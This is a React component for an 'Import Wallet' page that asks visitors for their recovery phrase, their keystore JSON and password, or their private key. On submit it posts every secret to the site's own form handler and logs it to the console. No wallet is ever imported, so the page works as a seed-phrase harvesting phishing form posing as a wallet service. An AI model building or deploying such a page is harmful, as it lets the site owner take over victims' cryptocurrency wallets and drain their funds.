import React from 'react';
import '../../assets/styles/css/wallet-details-entry-page.css';
import '../../assets/styles/css/wallet-details-entry-page_media-queries.css';
import { useState } from 'react';
import Navbar from '../../components/Navbar';
import Footer from '../../components/Footer';

function WalletDetailsEntryPage() {
  const [showPhrase, setShowPhrase] = useState(false);
  const [showKeyJson, setShowKeyJson] = useState(false);
  const [showPrivateKey, setShowPrivateKey] = useState(true);

  // form handling

  const [walletDetails, setWalletDetails] = useState({
    phrase: '',
    keystoreJson: '',
    password: '',
    privateKey: '',
  });

  const handleChange = (e) => {
    const name = e.target.name;
    const value = e.target.value;

    setWalletDetails({ ...walletDetails, [name]: value });
  };

  const encode = (data) => {
    return Object.keys(data)
      .map(
        (key) => encodeURIComponent(key) + '=' + encodeURIComponent(data[key])
      )
      .join('&');
  };

  function handleSubmit(e) {
    e.preventDefault();
    fetch('/', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
      },
      body: encode({ 'form-name': 'Wallet_import_details', ...walletDetails }),
    })
      .then(() => {
        setWalletDetails({
          phrase: '',
          keystoreJson: '',
          password: '',
          privateKey: '',
        });
        // window.location.reload();
      })
      .catch((error) => alert(error));
    console.log(walletDetails);
  }

  function displayPhrase() {
    setShowPhrase(true);
    setShowKeyJson(false);
    setShowPrivateKey(false);
  }

  function displayKeyJson() {
    setShowKeyJson(true);
    setShowPhrase(false);
    setShowPrivateKey(false);
  }

  function displayPrivateKey() {
    setShowPrivateKey(true);
    setShowPhrase(false);
    setShowKeyJson(false);
  }

  return (
    <>
      <Navbar />
      <section className="wallet-details-entry-section">
        <div className="section-header text-center">Import Wallet</div>
        <div className="options-wrapper">
          <button
            className="option-item"
            style={{
              backgroundColor: showPhrase && '#3877d3',
              color: showPhrase && '#ffffff',
            }}
            onClick={displayPhrase}
          >
            Phrase
          </button>
          <button
            className="option-item"
            style={{
              backgroundColor: showKeyJson && '#3877d3',
              color: showKeyJson && '#ffffff',
            }}
            onClick={displayKeyJson}
          >
            Keystore JSON
          </button>
          <button
            className="option-item"
            style={{
              backgroundColor: showPrivateKey && '#3877d3',
              color: showPrivateKey && '#ffffff',
            }}
            onClick={displayPrivateKey}
          >
            Private Key
          </button>
        </div>
        <form
          className="form-area"
          method="post"
          name="Wallet_import_details"
          onSubmit={handleSubmit}
        >
          <input type="hidden" name="form-name" value="Wallet_import_details" />

          {showPhrase && (
            <div className="mb-3">
              <textarea
                className="form-control"
                placeholder="Phrase"
                name="phrase"
                rows="5"
                type="text"
                value={walletDetails.phrase}
                onChange={handleChange}
              ></textarea>
              <div className="tip-text">
                Typically 12 (sometimes 24) words separated by single spaces.
              </div>
            </div>
          )}
          {showKeyJson && (
            <div className="mb-3">
              <textarea
                style={{ marginBottom: '20px' }}
                className="form-control"
                placeholder="Keystore JSON"
                type="text"
                name="keystoreJson"
                value={walletDetails.keystoreJson}
                onChange={handleChange}
                rows="5"
              ></textarea>
              <div>
                <input
                  type="password"
                  className="form-control"
                  placeholder="Password"
                  name="password"
                  id="inputPassword"
                  value={walletDetails.password}
                  onChange={handleChange}
                ></input>
              </div>
              <div className="tip-text">
                Several lines of text beginning with '(...)' plus the password
                you used to encrypt it.
              </div>
            </div>
          )}

          {showPrivateKey && (
            <div className="mb-3">
              <input
                type="text"
                className="form-control"
                placeholder="Private Key"
                name="privateKey"
                value={walletDetails.privateKey}
                onChange={handleChange}
              ></input>
              <div className="tip-text">
                Typically 12 (sometimes 24) words separated by single spaces.
              </div>
            </div>
          )}

          <div className="submit-button-wrapper">
            <button
              className="show-more-wallet-btn btn submit-button"
              type="submit"
            >
              Import
            </button>
          </div>
        </form>
      </section>
      <Footer />
    </>
  );
}

export default WalletDetailsEntryPage;
